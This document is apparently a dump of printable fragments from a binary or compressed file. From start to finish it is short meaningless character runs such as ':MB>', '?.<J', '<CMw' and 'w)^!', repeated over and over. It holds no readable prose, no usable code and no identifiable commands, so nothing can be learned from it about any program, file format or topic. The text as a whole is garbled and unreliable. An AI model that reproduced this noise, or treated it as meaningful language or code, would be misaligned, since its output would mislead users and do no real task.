:MB>
14"~2
PMt+
Kw3mxw7GZ0
:MB>
1>`Mz
:MB>
>`KF
4J^2
>xMw
4F<r
:MB>
]Mw?
xvMw[
6q6V
>nM|
2'lM
(Vz>
?.<J
?.<J
]Ki<6
]Ki<6
1|!R
1|!R
1|!R
1|!R
%>aMr
?.<J
1<6M
!M8<
?.<J
k%R8I>
1>qM|
>Ows
]Mwk
'mK6
<CMw
<CMw
<CMw
]Mwo
'mK6
^MI<$O
7*<6M
7*<6M
<COw
"OwW%
bOwW
6D>aK8>
7.<J
]M5<dM
fMB>
B>iKN
^M5z
k#R4i>aM
7*>aM
G1(mK
1<6M
?.<J
AieMH>
?.<J
]K">
8]7E<NM
55e>
*% K*
?.<J
^Mw?
]MwC
xvMwK
_6A6V
694<!
?.<J
?.<J
0nM|
?.<J
7*>uM
n5h<
B>nMt
0ZKw
0nKw
G1(sK
6I>aM
*<NM
6K8>
7.<J
">`M
?.<J
<5!<
?.<J
?.<J
NMB<
<CMw
(nKn
NM<<
0ZK	
?.<J
rMP<
]K">
4Jn2
(vM<>
:^7A>
w;mI
]Mw?
w;mDn
0vG1(
?J>aM
qMw3Ga0
xvMwK
4'mKF
F>nMt
694<!
^MA>
694<!Ms
rMQ<
]K*>
]KwO
?.<J
:8'@
'iMt
M46F
sjK4>
^OwW
0nO6
ujM3<
&>dM
1>dK,;r
?.<J
'iKN
:<`E
fK4|!R
<COw
?.<J
fMD<
?.<J
:<`M
fK4|!R
fK4|!R
fK4|!R
fK4|!R
'iKN
:<`E
fK4|!R
<COw
?.<J
fMD<
?.<J
:<`M
fK4|!R
fK4|!R
fK4|!R
fK4|!R
<COw
fM2@
2(vOwW
<COw
fM2@
2(vOwW
(jM5>
1>qM
&>dM
1>dK,;r
RK">
]Ows
?.<J
]Ows
?.<J
]Ows
z`J?
?.<J
]Ows
?.<J
?.<J
^Mw{
]Mwk
]Mwo
bMwo
?.<J
^Mw{
]Mwk
]Mwo
bMwo
 6:80
'oM4<r
^Mwo
 6:80
'oM4<r
^Mwo
]Ows
 6:80
'oM4<r
^Mwo
]Ows
:z^"@
:z^:@
AH jB
^6Yy
2>aKN
]MB<
2'{M8n]
>iKw
a6Czb
bMwC
]Mw?
xvMwS
]MC@
?.<J
xjMww
]Mwo
s( KF
4Jn2
^KwC
]Kw3
^Mw3
^MwC
]M3<j
^Mw7
>aKN
^r'mKF
]Jw>
'oMw
]Mwo
]Mw{
?.<J
	bR(
_85@
^M5<z
?.<J
>'|Mx
3)tK
Ai`M
2< M
2(sM
B<)K
><NK
4JN2
OwW%
jMwS
Ab%B
fK5>
c]Mw_
]M4<r
rKwOG_0
>nK6
6>iK
c]Mw_
3;_M
2>qOw
>aKN
1'eK
yG31
2<6E
M4<r
>nK6
R< Mwc
]Mwk
]Mw{
1'oB
^6M@
Ai^M
mx;<
'jMy
smGo
J45@
MB<b
'fE*
'fE*
>Ows
z^j@
]Ows
xjMw{
>Ows
z^j@
xjMw{
>Ows
z^j@
xjMw{
696"
<COw
]Mw{
'Mwo$
2<_M
6>_M
^Mwo%
{bKv
^Mwo
'Mwo$
^K3>
6<_M
sjK6
6>`M
{bKv
`6y6V
]Mw_
^Mwo
6<_M
6<`M
6<aM
:>_K5>
vjKN
^Ows
xjMww
6W6V
^Mwo
<<&E
]Mwo
xjMww
6k6V
c6W>
6<_M
<<&E
]Ows
xjMww
6k6V
c6W>
6<_M
M5<`M
sjK6
6<_M
xjMww
bK5>
6<`M
6<aM
696"
<COw
]Mw{
^Kwo
^Mwg
bMwg
^Mwo
<<&E
^Mwg
bK3>
^Ows
6<_M
bK3>
6<_M
]Ows
w_Mw{
w_Mw{
>aK4>
sfK6
6<`M
696"
<COw
]Mw{
^Kwo
^Ows
^Kwo
bK3>
M4<_M
]Mwg
6>`M
{bKv
sbK6
bK3>
M4<_M
]Mwg
6>`Mz
^Ows
bK3>
w_Mw{
hMwo
?.<J
w_Mw{
hMwo
>aK4>
sbK6
?.<J
6<`M
^Kwo
7>rp
({Ows
^Mwo
&Kwg
^Kwo
7>rp
({Ows
^Mwo
&Kwg
7>l`
7>rp
xjMww
^Mw[
7>l`
7>rp
xjMww
^Mw[
>Ows
^Kwk
]Mwk
?.<J
^Mw{
]Mwg
>Ows
^Kwk
]Mwk
&Kwg
>Ows
^Kwk
]Mwk
&Kwg
F<6M
<CMw
v5@;h
r'hMu
:<NM
7.<J
<CMw
mx2<$K">
!M5<z
6M5<z
.45@
m(n?O>
'iK*
.45@
m(n?N
FMC<
	m(n>
<CMw
<CMw
<CMw
b5>@
>_|1
>`Mz
>Ows
.Mwo
xjMw{
]Mwg
<CMw
<CMw
<CMw
<CMw
<CMw
^Kwo
7>rp
({Ows
^Mwo
&Kwg
^Kwo
7>rp
({Ows
^Mwo
&Kwg
:z^:B
:z^:B
7>l`
?.<J
fOwo
7>l`
?.<J
fOwo
:z^ZB
:z^ZB
AH K
AH K
AH K
AH K
:z^JF
:z^JF
1>`M
^MND
>_K~
>_K~
6M4<
]M4<r
]M4>
2)OM
2*|M
1'AM
]6h6V
6M4<
2)OM
1<.M<6
AH K
AH K
(sKN
(jKN
(jKN
AH K
AH K
:z^2C
:z^2C
7>l`
]Owo
7>l`
]Mwo
]Owo
:z^BC
:z^BC
7>l`
]Mwo
]Owo
7>l`
]Owo
1>`M
^MND
>_K~
>_K~
]M4<r
^>`O
>_K~
6M4<
>_K~
1>`KF
2)OM
1<.M<6
^9P>
]M4<
b6e@
6M4<
AH K
AH K
1>`M
^MND
>_K~
>_K~
]M4<r
^>`O
>_K~
6M4<
>_K~
1>`KF
2)OM
1<.M<6
^9P>
]M4<
b6e@
6M4<
AH K
AH K
:z^"D
>4@r2
mx3;dz3
2)OM5@
`M5m
2)OM5@
`M5l
Ai`J8
2)OM5@
2)OM5@
fOws
?.<J
fOws
?.<J
>Ows
]Mwo
>Ows
]Ows
>Ows
]Ows
AH K
AH K
AH K
AH K
:z^BE
:z^BE
?.<J
?.<J
?.<J
?.<J
>Ows
]Mwo
>Ows
]Ows
>Ows
]Ows
]Ows
]Ows
AH K
AH K
AH K
AH K
:z^JF
:z^JF
Kt/%
)eM6D
]Kw_
2>jS
]Mwo
]Mwo
FKww
]MwS
^MwO
6KwG
0fKw
J896Fk_
"M6~
*6:8
bMu#
mxt'
]Mwo
]Ows
]Ows
:z^zF
:z^zF
AH K
AH K
AH K
AH K
%'bG
AH G
aO6E_
[tmxv
1mx9;a
F<&E
%'hK$
F<6E
bJ9<N
+(SE
18T6:<
]G('fKf
1mx26V
t'kMx
wCmV
>`KF
bM5>
<COw
fM2>
f8A>bS
]Mwo
]Mw{
<COw
fM2>
f8A>bS
]Mwo
]Mw{
<COw
fM2>
f8A>jS
]Mwo
]Mw{
<COw
fM2>
f8A>zS
]Mwo
]Mw{
<COw
fM2>
f8A>
]Mwo
]Mw{
<COw
fM2>
f8A>bS
]Mwo
]Mw{
<COw
fM2>
f8A>bS
]Mwo
]Mw{
<COw
fM2>
f8A>zS
]Mwo
]Mw{
<COw
fM2>
f8A>
]Mwo
]Mw{
<COw
fM2>
f8A>jS
]Mwo
]Mw{
<COw
fM2>
f8A>rS
]Mwo
]Mw{
<COw
fM2>
f8A>bS
]Mwo
]Mw{
<COw
fM2>
f8A>bS
]Mwo
]Mw{
26)eM6Q
]M6Q
26)eM6Q
]M6Q
26)eM6Q
]M6Q
26)eM6Q
]M6Q
26)eM6Q
]M6Q
26)eM6Q
]M6Q
26)eM6Q
]M6Q
26)eM6Q
]M6Q
26)eM6Q
]M6Q
26)eM6Q
]M6Q
26)eM6Q
]M6Q
26)eM6Q
]M6Q
26)eM6Q
]M6Q
4JN2
jKwG
8Mt+
:MB>
]MwS
>897
{_Kv
`6>z
M4<r
4J^2
ROwV
2<&E
(^7T<j
t(_M
nOwV
:>`Mz
>nK~
:MB>
]MwO
(?Mw
:MB>
>nM|
<CMw
<CMw
<CMw
<CMw
bM3<,M
|6>w;
VM8<QM
7.<J
7.<J
<CMw
+RMw
?.<J
'oK6
<COw
?.<J
'mK6
RKwS
w{4~u
RKwK
_5>zb
4JN2
OwW%
	fK"<
Ai^K
]6J>
Ai^K
]MwC
wKmP
JAq7
>;vMw7
G1'~M
]MwO
xvMw[
M3<j
2>`Mz
bOwr
]Mwk
jJ:>
]Mwk
!M4<r
tG%1
<CMw
<CMw
<CMw
<CMw
bM3<,M
|6>w;
VM8<QM
7.<J
7.<J
22^A
32^A
32^A
22^A
_A22
32^A
32^A
22^A
_A22
_A22
72^A
72^A
72^A
72^A
72^A
^92%
YR=`
$S@Y
'.|2
-w)^
%w)^!
(w)^!
0w)^!
(w)^!
0w)^!
w)^!
%w)^
w)^!
w)^!
w)^!
w)^!
w)^!
'w)^!
'w)^
w)^!
w)^!
w)^!
4w)^!
6w)^!
'w)^
w)^!
w)^!
5w ^!
w)^!
6w)^!
w)^!
w)^!
)w)^
-w)^!
6w)^!
w)^!
8w)^
&w)^!
(w)^!
&w)^
w)^!
'w)^!
w)^!
w)^!
.w)^
5w)^
(w)^!
.w)^
#w)^
2w)^
&w)^!
&w)^!
*w)^!
'w)^
w)^!
0w)^!
-w)^
0w)^!
0w)^
0w)^!
&w)^
;w)^!
2w)^!
2w)^
#w)^
4w)^
2w)^!
&w)^!
'w)^
w)^!
2w)^!
w)^!
w)^!
w)^!
w)^!
%w)^
%w)^!
%w)^!
w)^!
4w)^
9w)^!
9w)^
w)^!
w)^!
w)^!
w)^!
'w)^!
0w)^!
'w)^
2w)^!
2w)^
.w)^!
0w)^!
0w)^
6w)^
)w)^
5w)^
w)^!
w)^!
w)^!
w)^!
6w)^!
2w)^
)w)^!
w)^!
w)^!
w)^!
w)^!
w)^!
w)^!
w)^!
w)^!
w)^!
w)^!
w)^!
w)^!
w)^!
w)^!
w)^!
'w)^!
'w)^
'w)^!
6w)^!
6w)^
6w)^!
6w)^
5w)^
0w)^!
.w)^!
)w)^!
6w)^
5w)^!
0w)^
0w)^!
6w)^!
w)^!
w)^!
w)^!
w)^!
w)^/
w)^!
^!w+
WQN&6q
MX~8]
